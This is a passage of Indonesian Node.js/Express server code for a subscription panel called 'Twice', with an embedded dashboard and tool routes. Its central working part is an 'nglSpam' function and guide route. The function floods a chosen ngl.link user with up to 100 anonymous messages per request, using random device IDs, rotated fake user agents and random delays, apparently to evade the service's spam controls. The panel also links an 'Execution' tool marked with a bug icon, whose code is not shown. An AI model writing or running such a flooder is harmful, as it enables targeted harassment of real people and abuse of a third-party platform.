    .menu-toggle:hover {
      background: rgba(255, 255, 255, 0.25);
      transform: scale(1.05);
    }
    
    .menu-toggle i {
      font-size: 20px;
    }

    /* Sidebar */
    .sidebar{
      width: 270px;
      background: rgba(26,26,26,0.95);
      backdrop-filter: blur(12px);
      border-right: 1px solid rgba(255,255,255,0.15);
      padding: 25px 20px;
      position: fixed;
      height: 100vh;
      overflow-y: auto;
      z-index: 1000;
      transform: translateX(-100%);
      transition: transform 0.3s ease;
    }
    
    .sidebar.active {
      transform: translateX(0);
    }
    
    /* Overlay ketika sidebar aktif */
    .sidebar-overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0,0,0,0.7);
      z-index: 999;
      display: none;
      backdrop-filter: blur(3px);
    }
    
    .sidebar-overlay.active {
      display: block;
    }

    /* Sidebar Header - Untuk mengatur logo dan judul */
    .sidebar-header {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      text-align: center;
      margin-bottom: 20px;
    }

    /* Efek Instagram Story pada Logo */
    .logo-container {
      position: relative;
      width: 100px;
      height: 100px;
      margin: 0 auto 15px;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .logo-ring {
      position: absolute;
      width: 100%;
      height: 100%;
      border-radius: 50%;
      background: conic-gradient(
        #ffffff 0%, 
        #ff0000 30%, 
        #AD4AE7 60%, 
        #ffffff 100%
      );
      animation: rotate 3s linear infinite;
      padding: 4px;
    }

    .logo {
      width: 92px;
      height: 92px;
      border-radius: 50%;
      object-fit: cover;
      display: block;
      z-index: 1;
      position: relative;
      background: #1a1a1a;
      border: 2px solid rgba(255,255,255,0.1);
    }

    @keyframes rotate {
      0% {
        transform: rotate(0deg);
      }
      100% {
        transform: rotate(360deg);
      }
    }
    
    .app-title {
      font-family:'Orbitron',sans-serif;
      font-size: 22px;
      font-weight:800;
      color:#fff;
      text-align:center;
      text-shadow:0 0 12px rgba(255,255,255,0.5);
      margin-bottom: 8px;
    }
    
    /* Gradien Border untuk Execution Mode */
    .access-info{
      font-size: 12px;
      text-align:center;
      color:var(--muted);
      background:rgba(255,255,255,0.1);
      padding: 8px 14px;
      border-radius:10px;
      margin-top: 5px;
      position: relative;
      z-index: 1;
      border: 1px solid rgba(255,255,255,0.1);
    }
    
    .access-info::before {
      content: '';
      position: absolute;
      top: -2px;
      left: -2px;
      right: -2px;
      bottom: -2px;
      background: linear-gradient(45deg, 
        #ffffff 0%, 
        #ff0000 30%, 
        #ff00ff 60%, 
        #ffffff 100%);
      border-radius: 12px;
      z-index: -1;
      animation: borderGlow 3s linear infinite;
      background-size: 400% 400%;
    }
    
    @keyframes borderGlow {
      0% {
        background-position: 0% 50%;
      }
      50% {
        background-position: 100% 50%;
      }
      100% {
        background-position: 0% 50%;
      }
    }
    
    .nav-menu{
      list-style:none;
      margin-top:25px;
    }
    
    .nav-item {
      margin-bottom: 8px;
    }
    
    .nav-link{
      display:flex;
      align-items:center;
      gap:12px;
      padding:14px 16px;
      color:var(--text);
      text-decoration:none;
      border-radius:12px;
      font-size:14px;
      transition:.3s;
      font-weight:500;
    }
    
    .nav-link:hover,
    .nav-link.active{
      background:linear-gradient(90deg,rgba(255,255,255,0.15),rgba(255,255,255,0.08));
      border-left:4px solid var(--secondary);
      transform:translateX(5px);
      box-shadow: 0 4px 12px rgba(0,0,0,0.3);
    }

    /* Main Content */
    .main-content{
      flex:1;
      padding: 20px 35px 35px;
      transition: margin-left 0.3s ease;
    }
    
    .header{
      display:flex;
      justify-content:space-between;
      align-items:center;
      margin-bottom:20px;
      padding-bottom:20px;
      border-bottom:1px solid rgba(255,255,255,0.15);
    }
    
    .header-title{
      font-family:'Orbitron',sans-serif;
      font-size:28px;
      font-weight:800;
      color:#fff;
      text-shadow:0 0 20px rgba(255,255,255,0.3);
    }
    
    /* NEW: Compact User Stats Card */
    .user-stats-card {
      width: 100%;
      max-width: 100%;
      margin-bottom: 35px;
    }
    
    .stats-card {
      border-radius: 18px;
      overflow: hidden;
      background: linear-gradient(180deg, rgba(255,255,255,0.03), rgba(0,0,0,0.12));
      box-shadow: 0 20px 40px rgba(0,0,0,0.6);
      position: relative;
      padding: 0;
      animation: fadeInUp 0.6s ease forwards;
      width: 100%;
      max-width: 450px; /* Lebih kecil lagi */
      margin: 0 auto;
    }
    
    .stats-card .header {
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 12px 15px; /* Lebih kecil lagi */
      background: linear-gradient(90deg, var(--primary) 0%, var(--secondary) 100%);
      border-bottom: 4px solid rgba(255,255,255,0.02);
    }
    
    .stats-card .header h3 {
      margin: 0;
      font-family: 'Orbitron', sans-serif;
      font-size: 16px; /* Lebih kecil lagi */
      letter-spacing: 0.6px;
      color: #fff;
      text-align: center;
    }
    
    .stats-card .body {
      padding: 15px; /* Lebih kecil lagi */
      background: linear-gradient(180deg, rgba(255,0,0,0.2) 0%, rgba(173,74,231,0.2) 100%);
      position: relative;
    }
    
    /* NEW: Compact user info layout dengan garis tidak terputus */
    .user-info-compact {
      display: flex;
      flex-direction: column;
      gap: 0;
      font-family: 'Roboto Mono', monospace;
      font-size: 14px;
      position: relative;
    }
    
    .info-row {
      display: flex;
      align-items: center;
      padding: 8px 0;
      position: relative;
    }
    
    .info-label {
      flex: 0 0 90px;
      font-weight: 700;
      color: rgba(255,255,255,0.9);
    }
    
    .info-separator {
      margin: 0 8px;
      color: rgba(255,255,255,0.5);
      z-index: 2;
    }
    
    .info-value {
      flex: 1;
      font-family: 'Orbitron', sans-serif;
      color: #e6e6e6;
      overflow: hidden;
      text-overflow: ellipsis;
    }
    
    /* Garis vertikal yang tidak terputus */
    .vertical-line {
      position: absolute;
      left: 97px; /* Posisi setelah label + margin */
      top: 0;
      bottom: 0;
      width: 1px;
      background: rgba(255,255,255,0.3);
      z-index: 1;
    }
    
    /* Garis horizontal yang memotong garis vertikal */
    .horizontal-line {
      position: absolute;
      left: 0;
      right: 0;
      height: 1px;
      background: rgba(255,255,255,0.3);
      z-index: 1;
    }
    
    .horizontal-line.top {
      top: 50%;
      transform: translateY(-50%);
    }

    /* Enhanced Quick Actions */
    .quick-actions {
      background: rgba(255, 255, 255, 0.05);
      backdrop-filter: blur(15px);
      border: 1px solid rgba(255, 255, 255, 0.15);
      border-radius: 18px;
      padding: 28px;
      margin-bottom: 30px;
      position: relative;
      overflow: hidden;
      transition: all 0.3s ease;
    }

    .quick-actions::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      right: 0;
      height: 3px;
      background: linear-gradient(90deg, var(--primary), var(--secondary));
      border-radius: 18px 18px 0 0;
    }

    .section-title {
      font-family: 'Orbitron', sans-serif;
      font-size: 22px;
      font-weight: 700;
      color: #fff;
      margin-bottom: 25px;
      display: flex;
      align-items: center;
      gap: 12px;
      text-shadow: 0 0 15px rgba(255,255,255,0.3);
    }

    .section-title i {
      color: var(--primary);
      font-size: 24px;
    }

    .actions-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
      gap: 18px;
    }

    .action-btn {
      background: linear-gradient(135deg, rgba(255,255,255,0.08), rgba(255,255,255,0.03));
      border: 1px solid rgba(255, 255, 255, 0.15);
      color: var(--text);
      padding: 20px 15px;
      border-radius: 14px;
      cursor: pointer;
      transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
      font-size: 14px;
      font-weight: 500;
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 12px;
      position: relative;
      overflow: hidden;
      backdrop-filter: blur(10px);
    }

    .action-btn::before {
      content: '';
      position: absolute;
      top: 0;
      left: -100%;
      width: 100%;
      height: 100%;
      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.1), transparent);
      transition: left 0.6s;
    }

    .action-btn:hover::before {
      left: 100%;
    }

    .action-btn:hover {
      transform: translateY(-8px) scale(1.05);
      box-shadow: 0 15px 30px rgba(255,255,255,0.15),
                  0 0 40px rgba(255,255,255,0.1),
                  inset 0 0 0 1px rgba(255,255,255,0.2);
      background: linear-gradient(135deg, rgba(255,255,255,0.15), rgba(255,255,255,0.08));
      border-color: var(--secondary);
    }

    .action-btn:active {
      transform: scale(0.95);
      box-shadow: 0 5px 15px rgba(255,255,255,0.2);
    }

    .action-btn i {
      font-size: 26px;
      transition: all 0.4s ease;
      color: var(--primary);
      filter: drop-shadow(0 0 8px rgba(255,255,255,0.3));
    }

    .action-btn:hover i {
      transform: rotate(15deg) scale(1.2);
      filter: drop-shadow(0 0 12px rgba(255,255,255,0.5));
    }

    .action-btn span {
      font-weight: 600;
      letter-spacing: 0.5px;
      transition: all 0.3s ease;
    }

    .action-btn:hover span {
      color: var(--secondary);
      text-shadow: 0 0 8px rgba(255,255,255,0.3);
    }

    /* Enhanced Recent Activity */
    .recent-activity {
      background: rgba(255, 255, 255, 0.05);
      backdrop-filter: blur(15px);
      border: 1px solid rgba(255, 255, 255, 0.15);
      border-radius: 18px;
      padding: 28px;
      margin-bottom: 30px;
      position: relative;
      overflow: hidden;
    }

    .recent-activity::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      right: 0;
      height: 3px;
      background: linear-gradient(90deg, var(--secondary), var(--primary));
      border-radius: 18px 18px 0 0;
    }

    .activity-list {
      display: flex;
      flex-direction: column;
      gap: 12px;
    }

    .activity-item {
      display: flex;
      align-items: center;
      gap: 15px;
      padding: 16px;
      background: rgba(255,255,255,0.03);
      border-radius: 12px;
      border: 1px solid rgba(255,255,255,0.08);
      transition: all 0.3s ease;
      position: relative;
      overflow: hidden;
    }

    .activity-item::before {
      content: '';
      position: absolute;
      left: 0;
      top: 0;
      bottom: 0;
      width: 4px;
      background: linear-gradient(180deg, var(--primary), var(--secondary));
      border-radius: 4px 0 0 4px;
    }

    .activity-item:hover {
      background: rgba(255,255,255,0.08);
      transform: translateX(8px);
      box-shadow: 0 5px 15px rgba(0,0,0,0.3);
    }

    .activity-icon {
      width: 40px;
      height: 40px;
      border-radius: 10px;
      display: flex;
      align-items: center;
      justify-content: center;
      background: linear-gradient(135deg, rgba(255,255,255,0.2), rgba(255,255,255,0.1));
      font-size: 16px;
      flex-shrink: 0;
      color: var(--primary);
    }

    .activity-content {
      flex: 1;
    }

    .activity-text {
      font-size: 14px;
      font-weight: 500;
      margin-bottom: 4px;
    }

    .activity-time {
      font-size: 12px;
      color: var(--muted);
      display: flex;
      align-items: center;
      gap: 6px;
    }

    .activity-time i {
      font-size: 11px;
    }

    /* Animations */
    @keyframes fadeInUp {
      0% { opacity: 0; transform: translateY(20px); }
      100% { opacity: 1; transform: translateY(0); }
    }

    @keyframes slideInLeft {
      0% { opacity: 0; transform: translateX(-20px); }
      100% { opacity: 1; transform: translateX(0); }
    }

    .quick-actions, .user-stats-card, .recent-activity {
      animation: fadeInUp 0.6s ease forwards;
    }

    .action-btn {
      animation: slideInLeft 0.5s ease forwards;
      opacity: 0;
    }

    .action-btn:nth-child(1) { animation-delay: 0.1s; }
    .action-btn:nth-child(2) { animation-delay: 0.2s; }
    .action-btn:nth-child(3) { animation-delay: 0.3s; }
    .action-btn:nth-child(4) { animation-delay: 0.4s; }

    /* Responsive */
    @media (min-width: 1024px) {
      .sidebar {
        transform: translateX(0);
      }
      .main-content {
        margin-left: 270px;
      }
      .menu-toggle {
        display: none;
      }
    }
    
    @media (max-width: 1023px) {
      .main-content {
        margin-left: 0;
        padding: 15px 20px 25px;
      }
      .header-title {
        font-size: 24px;
      }
      .actions-grid {
        grid-template-columns: repeat(2, 1fr);
        gap: 15px;
      }
      .action-btn {
        padding: 18px 12px;
      }
      .action-btn i {
        font-size: 22px;
      }
      .server-banner {
        min-height: 200px;
      }
      .banner-content {
        left: 15px;
        bottom: 10px;
      }
      .status-indicator {
        right: 15px;
        bottom: 10px;
      }
    }

    @media (max-width: 480px) {
      .actions-grid {
        grid-template-columns: 1fr;
      }
      .quick-actions, .recent-activity {
        padding: 20px;
      }
      .stats-card {
        max-width: 100%;
      }
      .vertical-line {
        left: 95px;
      }
    }
    
   .header-icon {
      display: flex;
      align-items: center;
      gap: 12px;
      background: linear-gradient(90deg, var(--primary), var(--secondary));
      padding: 14px 20px;
      border-radius: 18px 18px 0 0;
      color: #fff;
      position: relative;
    }

    /* Ikon 👥 + tanda plus */
    .user-icon {
      position: relative;
      width: 32px;
      height: 32px;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .user-icon .fa-user-group {
      font-size: 24px;
      color: #fff;
      filter: drop-shadow(0 0 8px rgba(255,255,255,0.3));
    }

    .header-icon h3 {
      font-family: 'Orbitron', sans-serif;
      font-size: 18px;
      font-weight: 700;
      margin: 0;
      text-shadow: 0 0 10px rgba(255,255,255,0.3);
      letter-spacing: 0.5px;
    }
  </style>
</head>
<body>
  <!-- Menu Toggle Button -->
  <div class="menu-toggle" id="menuToggle">
    <i class="fas fa-bars"></i>
  </div>

  <!-- Sidebar Overlay -->
  <div class="sidebar-overlay" id="sidebarOverlay"></div>

  <!-- Sidebar -->
  <div class="sidebar" id="sidebar">
    <div class="sidebar-header">
      <div class="logo-container">
        <div class="logo-ring"></div>
        <img src="https://files.catbox.moe/ygv8bt.mp4" class="logo" alt="DictiveCore Logo">
      </div>
      <div class="app-title">Twice</div>
      <div class="access-info"><b><i>Secure System Iterface</i></b></div>
    </div>
    
    <ul class="nav-menu">
      <li class="nav-item"><a href="/dashboard" class="nav-link active"><i class="fas fa-tachometer-alt"></i>Dashboard</a></li>
      <li class="nav-item"><a href="/profile" class="nav-link"><i class="fas fa-user"></i>Profile</a></li>
      <li class="nav-item"><a href="https://te.me/sennmods1" class="nav-link"><i class="fab fa-telegram"></i>Telegram</a></li>
      <li class="nav-item"><a href="https://wa.me/6282189275004" class="nav-link"><i class="fab fa-whatsapp"></i>WhatsApp</a></li>
      <li class="nav-item"><a href="/chat-ai" class="nav-link"><i class="fas fa-robot"></i>Chat AI</a></li>
      <li class="nav-item"><a href="/execution" class="nav-link"><i class="fas fa-bug"></i>Execution</a></li>
      <li class="nav-item"><a href="/qr-generator" class="nav-link"><i class="fas fa-qrcode"></i>QR Generator</a></li>
      <li class="nav-item"><a href="/tiktok" class="nav-link"><i class="fab fa-tiktok"></i>TikTok Downloader</a></li>
      <li class="nav-item"><a href="/quoteip" class="nav-link"><i class="fas fa-mobile-alt"></i>iPhone Quote</a></li>
      <li class="nav-item"><a href="/ngl-spam/guide" class="nav-link"><i class="fas fa-message"></i>Spam NGL</a></li>
      <li class="nav-item"><a href="/logout" class="nav-link"><i class="fas fa-sign-out-alt"></i>Logout</a></li>
    </ul>
  </div>

  <!-- Main Content -->
  <div class="main-content">
    <!-- Server Status Banner - Full Width dengan Video -->
    <div class="server-banner">
    <video class="banner-video" autoplay muted loop playsinline preload="auto" 
        poster="https://files.catbox.moe/t5fw19.jpg"
        onerror="this.style.display='none'">
  <source src="https://files.catbox.moe/ygv8bt.mp4" type="video/mp4">
  <!-- Backup kalau video utama gagal -->
  <source src="https://assets.codepen.io/3364143/710.mp4" type="video/mp4">
</video>
      
      <div class="banner-content">
        <div class="banner-title">Twice</div>
        <div class="banner-time">
          <i class="fas fa-clock"></i>
          <span id="currentTime">Loading...</span>
        </div>
      </div>
      <div class="status-indicator">
        <div class="status-dot"></div>
        <span>Online</span>
      </div>
    </div>

    <div class="header">
      <h1 class="header-title">Dashboard</h1>
    </div>

    <!-- NEW: Compact User Stats Card dengan garis tidak terputus -->
<div class="user-stats-card">
  <div class="stats-card">
    <div class="header-icon">
      <!-- 🔹 Ikon gabungan -->
      <div class="user-icon">
        <i class="fa-solid fa-user-group"></i>
      </div>
      <h3>User Information</h3>
    </div>

    <div class="body">
      <div class="user-info-compact">
        <!-- Garis vertikal -->
        <div class="vertical-line"></div>
        <!-- Garis horizontal -->
        <div class="horizontal-line top"></div>

        <div class="info-row">
          <div class="info-label">Username</div>
          <div class="info-separator"></div>
          <div class="info-value" id="usernameDisplay">Loading...</div>
        </div>

        <div class="info-row">
          <div class="info-label">Expired</div>
          <div class="info-separator"></div>
          <div class="info-value" id="expiredDisplay">Loading...</div>
        </div>
      </div>
    </div>
  </div>
</div>

    <!-- Enhanced Quick Actions -->
    <div class="quick-actions">
      <h2 class="section-title">
        <i class="fas fa-rocket"></i>
        Quick Actions
      </h2>
      <div class="actions-grid">
        <button class="action-btn" onclick="location.href='/execution'">
          <i class="fas fa-bug"></i>
          <span>Execution</span>
        </button>
        <button class="action-btn" onclick="location.href='/chat-ai'">
          <i class="fas fa-robot"></i>
          <span>Chat AI</span>
        </button>
        <button class="action-btn" onclick="location.href='/qr-generator'">
          <i class="fas fa-qrcode"></i>
          <span>QR Generator</span>
        </button>
        <button class="action-btn" onclick="location.href='/tiktok'">
          <i class="fab fa-tiktok"></i>
          <span>Tiktok Download</span>
        </button>
        <button class="action-btn" onclick="location.href='/quoteip'">
          <i class="fas fa-mobile-alt"></i>
          <span>iPhone Quote</span>
        </button>
        <button class="action-btn" onclick="location.href='/ngl-spam/guide'">
          <i class="fas fa-message"></i>
          <span>Spam NGL</span>
        </button>
      </div>
    </div>

    <!-- Enhanced Recent Activity -->
    <div class="recent-activity">
      <h2 class="section-title">
        <i class="fas fa-history"></i>
        Recent Activity
      </h2>
      <div class="activity-list" id="recentActivity">
        <!-- Activity items will be loaded here -->
      </div>
    </div>
  </div>

  <script>
// Menu toggle functionality
    const menuToggle = document.getElementById('menuToggle');
    const sidebar = document.getElementById('sidebar');
    const sidebarOverlay = document.getElementById('sidebarOverlay');
    
    function toggleSidebar() {
      sidebar.classList.toggle('active');
      sidebarOverlay.classList.toggle('active');
    }
    
    menuToggle.addEventListener('click', toggleSidebar);
    sidebarOverlay.addEventListener('click', toggleSidebar);
    
    // Update current time
    function updateCurrentTime() {
      const now = new Date();
      const timeString = now.toLocaleTimeString('id-ID', {
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit'
      });
      document.getElementById('currentTime').textContent = timeString;
    }
    
    // Load user data - FIXED: gunakan data dari server yang sudah di-inject
    function loadUserData() {
      // Data sudah tersedia dari server
      document.getElementById('usernameDisplay').textContent = '${username}';
      document.getElementById('expiredDisplay').textContent = '${formattedExp}';
    }

    // Load recent activity - FIXED: hilangkan template literal
    function loadRecentActivity() {
      const username = document.getElementById('usernameDisplay').textContent;
      const activities = [
        { 
          icon: 'fas fa-user-check', 
          text: 'Login berhasil sebagai <strong>' + username + '</strong>', 
          time: 'Baru saja'
        },
        { 
          icon: 'fas fa-shield-alt', 
          text: 'Sistem keamanan diperbarui ke versi 2.1', 
          time: '5 menit lalu'
        },
        { 
          icon: 'fas fa-server', 
          text: 'Server maintenance selesai', 
          time: '1 jam lalu'
        },
        { 
          icon: 'fas fa-robot', 
          text: 'AI model diperbarui ke v2.1', 
          time: '2 jam lalu'
        },
        { 
          icon: 'fas fa-bug', 
          text: 'Function bug update', 
          time: '3 jam lalu'
        }
      ];
      
      const activityList = document.getElementById('recentActivity');
      activityList.innerHTML = activities.map(activity => 
        '<div class="activity-item">' +
          '<div class="activity-icon">' +
            '<i class="' + activity.icon + '"></i>' +
          '</div>' +
          '<div class="activity-content">' +
            '<div class="activity-text">' + activity.text + '</div>' +
            '<div class="activity-time">' +
              '<i class="fas fa-clock"></i>' +
              activity.time +
            '</div>' +
          '</div>' +
        '</div>'
      ).join('');
    }
    
    // Initialize when page loads
    document.addEventListener('DOMContentLoaded', function() {
      loadUserData();
      updateCurrentTime();
      loadRecentActivity();
      
      // Update time every second
      setInterval(updateCurrentTime, 1000);
    });
    
    // Close sidebar when clicking on a link (for mobile)
    document.querySelectorAll('.nav-link').forEach(link => {
      link.addEventListener('click', function() {
        if (window.innerWidth < 1024) {
          toggleSidebar();
        }
      });
    });
  </script>
</body>
</html>`;
  
  res.send(html);
});

// Route untuk Chat AI
app.get("/chat-ai", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "Tools", "Chatai.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

// Route untuk IQC 
app.get("/quoteip", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "Tools", "iqc.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

// Route untuk Profile 
app.get("/profile", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "Tools", "profil.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

// Route untuk QR Generator 
app.get("/qr-generator", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "Tools", "qr-generator.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

// Route untuk TikTok 
app.get("/tiktok", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "Tools", "tiktok.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

// ============================================
// TRACKING SYSTEM - Di bagian paling atas file
// ============================================
const userTracking = {
  requests: new Map(), // Track per user
  targets: new Map(),  // Track per target
  
  // Reset otomatis tiap 24 jam
  resetDaily() {
    this.requests.clear();
    this.targets.clear();
    console.log('🔄 Daily tracking reset');
  },
  
  // Cek apakah user sudah melebihi limit harian
  canUserSend(userId, count) {
    const today = new Date().toDateString();
    const key = `${userId}-${today}`;
    const current = this.requests.get(key) || 0;
    return current + count;
  },
  
  // Cek apakah target sudah melebihi limit harian
  canTargetReceive(target, count) {
    const today = new Date().toDateString();
    const key = `${target}-${today}`;
    const current = this.targets.get(key) || 0;
    return current + count;
  },
  
  // Update counter setelah berhasil kirim
  updateUser(userId, count) {
    const today = new Date().toDateString();
    const key = `${userId}-${today}`;
    const current = this.requests.get(key) || 0;
    this.requests.set(key, current + count);
  },
  
  updateTarget(target, count) {
    const today = new Date().toDateString();
    const key = `${target}-${today}`;
    const current = this.targets.get(key) || 0;
    this.targets.set(key, current + count);
  },
  
  // Lihat statistik user
  getUserStats(userId) {
    const today = new Date().toDateString();
    const key = `${userId}-${today}`;
    return this.requests.get(key) || 0;
  },
  
  // Lihat statistik target
  getTargetStats(target) {
    const today = new Date().toDateString();
    const key = `${target}-${today}`;
    return this.targets.get(key) || 0;
  }
};

// Auto-reset setiap 24 jam (midnight)
setInterval(() => {
  const now = new Date();
  if (now.getHours() === 0 && now.getMinutes() === 0) {
    userTracking.resetDaily();
  }
}, 60000); // Cek tiap 1 menit

// ============================================
//             FUNGSI NGL SPAM
// ============================================
async function nglSpam(target, message, count) {
  const logs = [];
  let success = 0;
  let errors = 0;

  console.log(`🔍 DEBUG: Starting NGL spam to ${target}, message: ${message}, count: ${count}`);

  const sendNGLMessage = async (target, message, attempt) => {
    const formData = new URLSearchParams();
    formData.append('username', target);
    formData.append('question', message);
    formData.append('deviceId', generateUUID());
    formData.append('gameSlug', '');
    formData.append('referrer', '');

    // Reduced delay
    if (attempt > 1) {
      const randomDelay = Math.floor(Math.random() * 2000) + 1000;
      await new Promise(resolve => setTimeout(resolve, randomDelay));
    }

    const userAgents = [
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
      'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
      'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
    ];
    const randomUserAgent = userAgents[Math.floor(Math.random() * userAgents.length)];

    try {
      console.log(`🔍 DEBUG: Sending attempt ${attempt} to ${target}`);
      
      const response = await axios.post('https://ngl.link/api/submit', formData, {
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
          'User-Agent': randomUserAgent,
          'Accept': '*/*',
          'Origin': 'https://ngl.link',
          'Referer': `https://ngl.link/${target}`,
          'X-Requested-With': 'XMLHttpRequest'
        },
        timeout: 10000
      });

      console.log(`🔍 DEBUG: Response status: ${response.status}, data:`, response.data);

      if (response.status === 200) {
        success++;
        logs.push(`[${attempt}/${count}] ✅ Berhasil dikirim ke ${target}`);
        return true;
      } else {
        errors++;
        logs.push(`[${attempt}/${count}] ❌ Gagal: HTTP ${response.status}`);
        return false;
      }
    } catch (error) {
      errors++;
      console.error(`🔍 DEBUG: Error in attempt ${attempt}:`, error.message);
      
      if (error.response) {
        logs.push(`[${attempt}/${count}] ❌ HTTP ${error.response.status}: ${error.response.data?.message || error.response.statusText}`);
      } else if (error.request) {
        logs.push(`[${attempt}/${count}] ❌ Network Error: Tidak dapat terhubung ke server NGL`);
      } else {
        logs.push(`[${attempt}/${count}] ❌ Error: ${error.message}`);
      }
      
      return false;
    }
  };

  // Validasi input
  if (!target || !message || count <= 0) {
    throw new Error('Input tidak valid');
  }

  if (count > 100) {
    throw new Error('Maksimal 100 pesan per request');
  }

  // Jalankan spam
  logs.push(`🚀 Memulai spam ke: ${target}`);
  logs.push(`📝 Pesan: ${message}`);
  logs.push(`🔢 Jumlah: ${count} pesan`);
  logs.push(`⏳ Delay: 1-3 detik random antar pesan`);
  logs.push(`─`.repeat(30));

  for (let i = 0; i < count; i++) {
    await sendNGLMessage(target, message, i + 1);
  }

  logs.push(`─`.repeat(30));
  logs.push(`📊 SELESAI! Sukses: ${success}, Gagal: ${errors}`);

  return { success, errors, logs };
}

// Helper function untuk generate UUID
function generateUUID() {
  return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
    const r = Math.random() * 16 | 0;
    const v = c === 'x' ? r : (r & 0x3 | 0x8);
    return v.toString(16);
  });
}

// ============================================
// ROUTE NGL SPAM WEB - UPDATED dengan Info Limit
// ============================================
app.get("/ngl-spam/guide", requireAuth, (req, res) => {
  const username = req.cookies.sessionUser;
  const users = getUsers();
  const currentUser = users.find(u => u.username === username);
  
  const formattedExp = currentUser ? new Date(currentUser.expired).toLocaleString("id-ID", {
    timeZone: "Asia/Jakarta"
  }) : "-";

  // Ambil statistik user
  const userId = req.ip || req.headers['x-forwarded-for'] || username;
  const userUsageToday = userTracking.getUserStats(userId);
  const remainingUser = 200 - userUsageToday;

  const html = `
  <!DOCTYPE html>
  <html lang="id">
  <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Panduan NGL Spam - Twice</title>
      <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
      <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600;800&family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
      <style>
        :root {
          --bg: #000000;
          --card: #1a1a1a;
          --text: #ffffff;
          --muted: #fff;
          --primary: #ff0000;
          --secondary: #AD4AE7;
          --accent: #666666;
        }
        
        * {
          margin: 0;
          padding: 0;
          box-sizing: border-box;
          font-family: 'Poppins', sans-serif;
        }
        
        body {
          background: radial-gradient(circle at 20% 20%, rgba(255,255,255,.1), transparent 30%),
                     radial-gradient(circle at 80% 10%, rgba(255,255,255,.08), transparent 25%),
                     radial-gradient(circle at 50% 90%, rgba(255,255,255,.05), transparent 30%),
                     var(--bg);
          color: var(--text);
          min-height: 100vh;
          overflow-x: hidden;
          line-height: 1.6;
        }
        
        .container {
          max-width: 1200px;
          margin: 0 auto;
          padding: 20px;
        }
        
        /* Server Status Banner */
        .server-banner {
          border-radius: 15px;
          margin: 20px auto 30px;
          position: relative;
          overflow: hidden;
          min-height: 200px;
          box-shadow: 0 10px 30px rgba(0,0,0,0.6);
          border: 1px solid rgba(255,255,255,0.2);
        }

        .banner-video {
          position: absolute;
          top: 0;
          left: 0;
          width: 100%;
          height: 100%;
          object-fit: cover;
          z-index: 0;
        }

        .server-banner::before {
          content: '';
          position: absolute;
          inset: 0;
          background: linear-gradient(to top, rgba(0,0,0,0.7) 0%, rgba(0,0,0,0.3) 100%);
          z-index: 1;
        }

        .banner-content {
          position: absolute;
          bottom: 15px;
          left: 25px;
          z-index: 2;
          text-align: left;
        }

        .banner-title {
          font-family: 'Orbitron', sans-serif;
          font-size: 20px;
          font-weight: 800;
          color: #fff;
          margin-bottom: 5px;
          text-shadow: 0 0 10px rgba(255,255,255,0.5);
        }

        .banner-subtitle {
          font-size: 13px;
          color: var(--text);
          opacity: 0.9;
          margin-bottom: 3px;
        }

        .banner-time {
          color: #ffff;
          font-size: 12px;
          font-weight: 600;
          display: flex;
          align-items: center;
          gap: 6px;
        }

        .status-indicator {
          position: absolute;
          bottom: 15px;
          right: 25px;
          z-index: 2;
          display: flex;
          align-items: center;
          gap: 8px;
          color: #00ff00;
          font-size: 13px;
          font-weight: 600;
          background: rgba(0,0,0,0.4);
          padding: 8px 16px;
          border-radius: 25px;
          backdrop-filter: blur(8px);
          border: 1px solid rgba(0,255,0,0.3);
        }

        .status-dot {
          width: 10px;
          height: 10px;
          border-radius: 50%;
          background: #00ff00;
          box-shadow: 0 0 10px #00ff00;
          animation: pulse 1.5s infinite;
        }

        @keyframes pulse {
          0% { 
            opacity: 1; 
            box-shadow: 0 0 0 0 rgba(0,255,0,0.7);
          }
          70% { 
            opacity: 0.7; 
            box-shadow: 0 0 0 10px rgba(0,255,0,0);
          }
          100% { 
            opacity: 1; 
            box-shadow: 0 0 0 0 rgba(0,255,0,0);
          }
        }

        /* Header */
